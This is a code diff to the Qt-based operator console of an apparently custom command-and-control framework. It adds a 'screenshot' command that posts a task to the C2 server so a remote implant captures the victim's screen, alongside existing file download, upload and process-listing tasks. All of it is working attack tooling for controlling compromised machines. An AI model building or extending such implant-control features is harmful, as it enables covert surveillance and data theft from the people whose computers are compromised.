@@ -151,6 +151,8 @@ class mainWidget(QtWidgets.QWidget):
             self.fileDownload(subCommand)
         if metaCommand == "upload" and BeaconInteraction == True:
             self.fileUpload(subCommand)
+        if metaCommand == "screenshot" and BeaconInteraction == True:
+            self.Screenshot()
 
     def helpMenu(self):
         r1 = "{0:<8s} -   {1}".format("help", "This help menu.")
@@ -160,7 +162,8 @@ class mainWidget(QtWidgets.QWidget):
         r5 = "{0:<8s} -   {1}".format("interact [Beacon ID]", "Interact with selected beacon.")
         r6 = "{0:<8s} -   {1}".format("download [filename]", "Tells implant to upload file to C2 server.")
         r7 = "{0:<8s} -   {1}".format("upload [filename]", "Tells implant to download file from C2 server to host.")
-        menu = "{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}".format(r1, r2, r3, r4, r5, r6, r7)
+        r8 = "{0:<8s} -   {1}".format("screenshot", "Tells implant to take screenshot")
+        menu = "{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}<br>{}".format(r1, r2, r3, r4, r5, r6, r7, r8)
         self.textEdit.append(TextColors.Green(menu))
     
     def clearCommandInput(self):
@@ -297,6 +300,13 @@ class mainWidget(QtWidgets.QWidget):
         self.textEdit.append("Command has been sent to implant\n")
         api_endpoint = "/tasks"
         request_payload_string = f'[{{"task_id":"{beacon_ID}","task_type":"list-processes"}}]'
+        request_payload = json.loads(request_payload_string)
+        api_post_request(api_endpoint, request_payload)
+    
+    def Screenshot(self):
+        self.textEdit.append("Command has been sent to implant\n")
+        api_endpoint = "/tasks"
+        request_payload_string = f'[{{"task_id":"{beacon_ID}","task_type":"screenshot"}}]'
         request_payload = json.loads(request_payload_string)
         api_post_request(api_endpoint, request_payload)
 
